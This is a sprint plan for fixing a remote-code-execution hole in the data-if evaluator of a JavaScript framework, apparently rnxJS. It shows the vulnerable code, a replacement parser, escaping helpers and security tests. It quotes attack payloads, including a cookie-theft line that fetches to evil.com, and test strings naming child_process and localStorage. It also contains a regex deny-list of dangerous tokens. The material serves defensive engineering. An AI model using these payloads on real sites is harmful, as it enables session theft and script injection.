# Sprint 1: Critical Security Fixes

**Priority**: CRITICAL
**Duration**: 1-2 weeks
**Goal**: Eliminate all critical and high-severity security vulnerabilities

---

## Overview

This sprint addresses security vulnerabilities that could prevent enterprise adoption and expose users to real attacks. These fixes are **non-negotiable** before any marketing push.

---

## Task 1.1: Fix Remote Code Execution (RCE) in safeEvaluateCondition

### Current Vulnerable Code

```javascript
// framework/ComponentLoader.js:10-28
function safeEvaluateCondition(expression, state) {
  try {
    const fn = new Function('state', `
      'use strict';
      try {
        return Boolean(${expression});
      } catch (e) {
        return false;
      }
    `);
    return fn(state);
  } catch (error) {
    return false;
  }
}
```

### Attack Examples

```html
<!-- Cookie theft -->
<div data-if="constructor.constructor('fetch(`https://evil.com?c=`+document.cookie)')()">

<!-- XSS -->
<div data-if="constructor.constructor('alert(1)')()">

<!-- DOM manipulation -->
<div data-if="(document.body.innerHTML='hacked',true)">
```

### Solution: Safe Expression Parser

Replace `new Function()` with a whitelist-based property accessor:

```javascript
/**
 * Safely evaluate a condition expression against state
 * Only allows property access patterns, no code execution
 *
 * Supported expressions:
 * - state.property
 * - state.nested.property
 * - !state.property (negation)
 * - state.property === 'value'
 * - state.property !== 'value'
 * - state.property > 0
 * - state.property < 10
 * - state.property >= 5
 * - state.property <= 5
 * - state.property && state.other
 * - state.property || state.other
 *
 * @param {string} expression - The condition expression
 * @param {Object} state - The reactive state object
 * @returns {boolean} - Evaluation result
 */
function safeEvaluateCondition(expression, state) {
  if (!expression || typeof expression !== 'string') {
    return false;
  }

  // Trim and normalize
  expression = expression.trim();

  // Block obvious attack patterns
  const dangerousPatterns = [
    /constructor/i,
    /prototype/i,
    /__proto__/i,
    /\beval\b/i,
    /\bFunction\b/i,
    /\bwindow\b/i,
    /\bdocument\b/i,
    /\bglobal\b/i,
    /\bprocess\b/i,
    /\brequire\b/i,
    /\bimport\b/i,
    /\bfetch\b/i,
    /\bXMLHttpRequest\b/i,
    /\blocalStorage\b/i,
    /\bsessionStorage\b/i,
    /\bcookie/i,
    /\[\s*['"`]/, // Bracket notation with strings
    /\(\s*\)/, // Function calls
    /`/, // Template literals
    /\$\{/, // Template interpolation
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(expression)) {
      console.warn(`[rnxJS] Blocked potentially dangerous expression: "${expression}"`);
      return false;
    }
  }

  try {
    return evaluateExpression(expression, state);
  } catch (error) {
    console.warn(`[rnxJS] Error evaluating condition "${expression}":`, error.message);
    return false;
  }
}

/**
 * Parse and evaluate a safe expression
 */
function evaluateExpression(expr, state) {
  // Handle logical operators (&&, ||)
  if (expr.includes('&&')) {
    const parts = expr.split('&&').map(p => p.trim());
    return parts.every(part => evaluateExpression(part, state));
  }

  if (expr.includes('||')) {
    const parts = expr.split('||').map(p => p.trim());
    return parts.some(part => evaluateExpression(part, state));
  }

  // Handle negation
  if (expr.startsWith('!')) {
    return !evaluateExpression(expr.slice(1).trim(), state);
  }

  // Handle comparison operators
  const comparisonMatch = expr.match(/^(state\.[a-zA-Z_$][\w.$]*)\s*(===|!==|==|!=|>=|<=|>|<)\s*(.+)$/);
  if (comparisonMatch) {
    const [, path, operator, rawValue] = comparisonMatch;
    const leftValue = getStateValue(path, state);
    const rightValue = parseValue(rawValue.trim());

    switch (operator) {
      case '===':
      case '==':
        return leftValue === rightValue;
      case '!==':
      case '!=':
        return leftValue !== rightValue;
      case '>':
        return leftValue > rightValue;
      case '<':
        return leftValue < rightValue;
      case '>=':
        return leftValue >= rightValue;
      case '<=':
        return leftValue <= rightValue;
      default:
        return false;
    }
  }

  // Handle simple property access (truthy check)
  const propertyMatch = expr.match(/^state\.([a-zA-Z_$][\w.$]*)$/);
  if (propertyMatch) {
    return Boolean(getStateValue(expr, state));
  }

  // Handle bare property name (assume state.propertyName)
  const barePropertyMatch = expr.match(/^([a-zA-Z_$][\w.]*)$/);
  if (barePropertyMatch) {
    return Boolean(getStateValue(`state.${expr}`, state));
  }

  console.warn(`[rnxJS] Unsupported expression syntax: "${expr}"`);
  return false;
}

/**
 * Safely get a value from state using dot notation
 */
function getStateValue(path, state) {
  // Remove 'state.' prefix if present
  const cleanPath = path.startsWith('state.') ? path.slice(6) : path;

  const keys = cleanPath.split('.');
  let current = state;

  for (const key of keys) {
    if (current === null || current === undefined) {
      return undefined;
    }
    if (typeof current !== 'object') {
      return undefined;
    }
    // Block prototype access
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      console.warn(`[rnxJS] Blocked prototype access attempt: "${path}"`);
      return undefined;
    }
    current = current[key];
  }

  return current;
}

/**
 * Parse a literal value from expression
 */
function parseValue(value) {
  // String literals
  if ((value.startsWith("'") && value.endsWith("'")) ||
      (value.startsWith('"') && value.endsWith('"'))) {
    return value.slice(1, -1);
  }

  // Boolean
  if (value === 'true') return true;
  if (value === 'false') return false;

  // Null/undefined
  if (value === 'null') return null;
  if (value === 'undefined') return undefined;

  // Number
  const num = Number(value);
  if (!isNaN(num)) return num;

  // Treat as string
  return value;
}
```

### Tests to Add

```javascript
// tests/security/safeEvaluateCondition.test.js

describe('safeEvaluateCondition security', () => {
  const state = { user: { name: 'Alice', age: 30 }, isAdmin: true, count: 5 };

  describe('blocks dangerous patterns', () => {
    const attacks = [
      "constructor.constructor('alert(1)')()",
      "__proto__.polluted = true",
      "this.constructor.constructor('return this')()",
      "window.location = 'evil.com'",
      "document.cookie",
      "fetch('https://evil.com')",
      "eval('alert(1)')",
      "Function('return this')()",
      "require('child_process')",
      "import('malicious')",
      "localStorage.getItem('token')",
      "state['constructor']",
      "state[`proto`]",
      "${alert(1)}",
    ];

    attacks.forEach(attack => {
      it(`blocks: ${attack.slice(0, 50)}...`, () => {
        expect(safeEvaluateCondition(attack, state)).toBe(false);
      });
    });
  });

  describe('allows safe patterns', () => {
    it('simple property access', () => {
      expect(safeEvaluateCondition('state.isAdmin', state)).toBe(true);
      expect(safeEvaluateCondition('isAdmin', state)).toBe(true);
    });

    it('nested property access', () => {
      expect(safeEvaluateCondition('state.user.name', state)).toBe(true);
    });

    it('negation', () => {
      expect(safeEvaluateCondition('!state.isAdmin', state)).toBe(false);
    });

    it('equality comparison', () => {
      expect(safeEvaluateCondition("state.user.name === 'Alice'", state)).toBe(true);
      expect(safeEvaluateCondition("state.user.name !== 'Bob'", state)).toBe(true);
    });

    it('numeric comparison', () => {
      expect(safeEvaluateCondition('state.count > 3', state)).toBe(true);
      expect(safeEvaluateCondition('state.count < 10', state)).toBe(true);
      expect(safeEvaluateCondition('state.user.age >= 30', state)).toBe(true);
    });

    it('logical AND', () => {
      expect(safeEvaluateCondition('state.isAdmin && state.count > 0', state)).toBe(true);
    });

    it('logical OR', () => {
      expect(safeEvaluateCondition('state.isAdmin || state.count > 100', state)).toBe(true);
    });
  });
});
```

### Files to Modify

1. `framework/ComponentLoader.js` - Replace `safeEvaluateCondition`
2. `tests/security/safeEvaluateCondition.test.js` - Add security tests
3. `tests/ComponentLoader.test.js` - Update existing tests

---

## Task 1.2: Add HTML Escape Utility

### Implementation

```javascript
// utils/security.js

/**
 * HTML entity map for escaping
 */
const HTML_ENTITIES = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',
  '/': '&#x2F;',
  '`': '&#x60;',
  '=': '&#x3D;'
};

/**
 * Escape HTML special characters to prevent XSS
 *
 * @param {string} str - String to escape
 * @returns {string} - Escaped string safe for HTML insertion
 *
 * @example
 * escapeHtml('<script>alert("xss")</script>')
 * // Returns: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
 */
export function escapeHtml(str) {
  if (str === null || str === undefined) {
    return '';
  }

  if (typeof str !== 'string') {
    str = String(str);
  }

  return str.replace(/[&<>"'`=/]/g, char => HTML_ENTITIES[char]);
}

/**
 * Escape string for use in HTML attributes
 * More aggressive escaping for attribute context
 *
 * @param {string} str - String to escape
 * @returns {string} - Escaped string safe for attribute values
 */
export function escapeAttribute(str) {
  if (str === null || str === undefined) {
    return '';
  }

  if (typeof str !== 'string') {
    str = String(str);
  }

  // Escape all non-alphanumeric characters
  return str.replace(/[^a-zA-Z0-9]/g, char => {
    return '&#' + char.charCodeAt(0) + ';';
  });
}

/**
 * Escape string for use in JavaScript string context
 *
 * @param {string} str - String to escape
 * @returns {string} - Escaped string safe for JS strings
 */
export function escapeJs(str) {
  if (str === null || str === undefined) {
    return '';
  }

  if (typeof str !== 'string') {
    str = String(str);
  }

  return str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/\f/g, '\\f')
    .replace(/</g, '\\x3c')
    .replace(/>/g, '\\x3e');
}

/**
 * Create a template tag for safe HTML with automatic escaping
 *
 * @example
 * const name = '<script>alert("xss")</script>';
 * const html = safeHtml`<div>Hello, ${name}!</div>`;
 * // Returns: '<div>Hello, &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;!</div>'
 */
export function safeHtml(strings, ...values) {
  let result = strings[0];

  for (let i = 0; i < values.length; i++) {
    result += escapeHtml(values[i]) + strings[i + 1];
  }

  return result;
}

/**
 * Mark a string as trusted HTML (bypass escaping)
 * USE WITH EXTREME CAUTION - only for sanitized content
 *
 * @param {string} html - Pre-sanitized HTML string
 * @returns {Object} - Trusted HTML object
 */
export function trustHtml(html) {
  return {
    __rnxTrustedHtml: true,
    toString: () => html,
    valueOf: () => html
  };
}

/**
 * Check if a value is trusted HTML
 */
export function isTrustedHtml(value) {
  return value && value.__rnxTrustedHtml === true;
}
```

### Usage Documentation

```javascript
// Example: Safe component template

import { escapeHtml, safeHtml } from 'rnxjs';

// Method 1: Manual escaping
function UserCard({ name, bio }) {
  return `
    <div class="card">
      <h3>${escapeHtml(name)}</h3>
      <p>${escapeHtml(bio)}</p>
    </div>
  `;
}

// Method 2: Tagged template (preferred)
function UserCard({ name, bio }) {
  return safeHtml`
    <div class="card">
      <h3>${name}</h3>
      <p>${bio}</p>
    </div>
  `;
}

// Method 3: Trusted content (for sanitized HTML)
import { trustHtml } from 'rnxjs';
import DOMPurify from 'dompurify';

function RichContent({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return `<div class="content">${trustHtml(sanitized)}</div>`;
}
```

### Tests

```javascript
// tests/security/escapeHtml.test.js

describe('escapeHtml', () => {
  it('escapes HTML tags', () => {
    expect(escapeHtml('<script>alert("xss")</script>'))
      .toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  it('escapes ampersands', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
  });

  it('escapes quotes', () => {
    expect(escapeHtml('Say "hello"')).toBe('Say &quot;hello&quot;');
    expect(escapeHtml("It's")).toBe('It&#x27;s');
  });

  it('handles null/undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('converts non-strings', () => {
    expect(escapeHtml(123)).toBe('123');
    expect(escapeHtml({ toString: () => '<b>' })).toBe('&lt;b&gt;');
  });
});

describe('safeHtml template tag', () => {
  it('escapes interpolated values', () => {
    const name = '<script>xss</script>';
    const result = safeHtml`<div>${name}</div>`;
    expect(result).toBe('<div>&lt;script&gt;xss&lt;/script&gt;</div>');
  });

  it('preserves template structure', () => {
    const result = safeHtml`<div class="card"><span>${'text'}</span></div>`;
    expect(result).toBe('<div class="card"><span>text</span></div>');
  });
});
```

---

## Task 1.3: Update Vulnerable Dependencies

### Commands

```bash
# Check current vulnerabilities
npm audit

# Fix what can be auto-fixed
npm audit fix

# Force fix (may have breaking changes)
npm audit fix --force

# Expected updates:
# - vitest: 1.x -> 4.x
# - happy-dom: 12.x -> 20.x
# - @vitest/coverage-v8: 1.x -> 4.x
# - @vitest/ui: 1.x -> 4.x
```

### Post-Update Testing

```bash
# Run full test suite
npm test

# Run with coverage
npm run test:coverage

# Check for regressions
npm run build
```

### Update package.json

```json
{
  "devDependencies": {
    "@playwright/test": "^1.57.0",
    "@vitest/coverage-v8": "^4.0.0",
    "@vitest/ui": "^4.0.0",
    "esbuild": "^0.27.0",
    "happy-dom": "^20.0.0",
    "vitest": "^4.0.0"
  }
}
```

---

## Task 1.4: Add Security Documentation

### Create SECURITY.md

```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 0.4.x   | :white_check_mark: |
| 0.3.x   | :warning: Critical fixes only |
| < 0.3   | :x:                |

## Reporting a Vulnerability

**DO NOT** open a public issue for security vulnerabilities.

Email security concerns to: security@rnxjs.dev (or your email)

Include:
- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

Response timeline:
- Acknowledgment: 48 hours
- Initial assessment: 1 week
- Fix timeline: Depends on severity

## Security Best Practices

### XSS Prevention

Always escape user input before rendering:

```javascript
import { escapeHtml, safeHtml } from 'rnxjs';

// Bad - vulnerable to XSS
function UserCard({ name }) {
  return `<div>${name}</div>`;
}

// Good - escaped
function UserCard({ name }) {
  return `<div>${escapeHtml(name)}</div>`;
}

// Best - template tag
function UserCard({ name }) {
  return safeHtml`<div>${name}</div>`;
}
```

### Content Security Policy

Recommended CSP headers:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
```

Note: rnxJS does NOT require `unsafe-eval` as of v0.4.0.

### data-if Expressions

The `data-if` attribute only supports safe expressions:

```html
<!-- Supported -->
<div data-if="state.isVisible">...</div>
<div data-if="state.user.role === 'admin'">...</div>
<div data-if="!state.loading">...</div>
<div data-if="state.count > 0 && state.isActive">...</div>

<!-- NOT supported (blocked for security) -->
<div data-if="someFunction()">...</div>
<div data-if="fetch('...')">...</div>
```

### Input Validation

Always validate user input server-side. Client-side validation is for UX only:

```html
<input data-bind="email" data-rule="required|email" />
```

## Known Security Considerations

1. **Template strings**: Use `escapeHtml()` for user content
2. **Event handlers**: Prefer function references over string handlers
3. **Third-party content**: Sanitize with DOMPurify before rendering
```

### Add to README

```markdown
## Security

See [SECURITY.md](./SECURITY.md) for:
- Reporting vulnerabilities
- XSS prevention guide
- CSP configuration
- Best practices
```

---

## Task 1.5: Add Input Sanitization Helpers

### Implementation

```javascript
// utils/sanitize.js

/**
 * Sanitize a string for safe display
 * Removes control characters and normalizes whitespace
 *
 * @param {string} str - String to sanitize
 * @returns {string} - Sanitized string
 */
export function sanitizeText(str) {
  if (str === null || str === undefined) {
    return '';
  }

  return String(str)
    // Remove control characters except newline and tab
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '')
    // Normalize line endings
    .replace(/\r\n/g, '\n')
    .replace(/\r/g, '\n')
    // Normalize whitespace
    .replace(/\t/g, '  ')
    // Remove null bytes
    .replace(/\0/g, '')
    .trim();
}

/**
 * Sanitize a URL to prevent javascript: and data: attacks
 *
 * @param {string} url - URL to sanitize
 * @returns {string|null} - Safe URL or null if unsafe
 */
export function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') {
    return null;
  }

  const trimmed = url.trim().toLowerCase();

  // Block dangerous protocols
  const dangerousProtocols = [
    'javascript:',
    'data:',
    'vbscript:',
    'file:',
  ];

  for (const protocol of dangerousProtocols) {
    if (trimmed.startsWith(protocol)) {
      console.warn(`[rnxJS] Blocked dangerous URL: ${url.slice(0, 50)}...`);
      return null;
    }
  }

  // Allow safe protocols
  const safeProtocols = ['http:', 'https:', 'mailto:', 'tel:', '//', '/'];
  const isSafe = safeProtocols.some(p => trimmed.startsWith(p)) ||
                 !trimmed.includes(':'); // Relative URLs

  return isSafe ? url : null;
}

/**
 * Sanitize object keys to prevent prototype pollution
 *
 * @param {Object} obj - Object to sanitize
 * @returns {Object} - Sanitized object
 */
export function sanitizeObject(obj) {
  if (!obj || typeof obj !== 'object') {
    return obj;
  }

  const dangerous = ['__proto__', 'constructor', 'prototype'];
  const result = Array.isArray(obj) ? [] : {};

  for (const key of Object.keys(obj)) {
    if (dangerous.includes(key)) {
      console.warn(`[rnxJS] Blocked dangerous object key: ${key}`);
      continue;
    }

    const value = obj[key];
    result[key] = typeof value === 'object' ? sanitizeObject(value) : value;
  }

  return result;
}
```

---

## Task 1.6: Security Test Suite

### Create Comprehensive Security Tests

```javascript
// tests/security/index.test.js

import { describe, it, expect, vi } from 'vitest';

describe('Security Test Suite', () => {
  describe('XSS Prevention', () => {
    // Test escapeHtml
    // Test safeHtml template
    // Test component rendering with malicious input
  });

  describe('Prototype Pollution Prevention', () => {
    it('blocks __proto__ in state paths', () => {
      // Test that data-bind="__proto__.polluted" is blocked
    });

    it('blocks constructor access', () => {
      // Test that state.constructor access is blocked
    });
  });

  describe('Expression Injection Prevention', () => {
    // Test all attack vectors in data-if
  });

  describe('URL Sanitization', () => {
    it('blocks javascript: URLs', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBeNull();
    });

    it('blocks data: URLs', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
    });

    it('allows https: URLs', () => {
      expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
    });
  });
});
```

---

## Acceptance Criteria

### Must Have (Sprint Complete)

- [ ] `safeEvaluateCondition` replaced with safe expression parser
- [ ] All known attack vectors blocked (see test suite)
- [ ] `escapeHtml` and `safeHtml` utilities added
- [ ] All dependencies updated to non-vulnerable versions
- [ ] `SECURITY.md` created with clear guidelines
- [ ] Security test suite with 100% coverage of security code
- [ ] `npm audit` shows 0 vulnerabilities

### Should Have

- [ ] Input sanitization helpers added
- [ ] CSP documentation added
- [ ] Security section in README
- [ ] Changelog entry for security fixes

### Nice to Have

- [ ] GitHub security advisories published for old versions
- [ ] Automated security scanning in CI
- [ ] Third-party security audit scheduled

---

## Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| Breaking change in `data-if` | Medium | Low | Document supported expressions |
| Test failures after dep update | High | Low | Run full test suite, fix issues |
| Users relying on unsafe patterns | Low | Medium | Clear migration guide |

---

## Definition of Done

1. All tasks completed and code reviewed
2. All tests passing
3. No security vulnerabilities in `npm audit`
4. Documentation updated
5. Changelog updated
6. Version bumped to 0.4.0
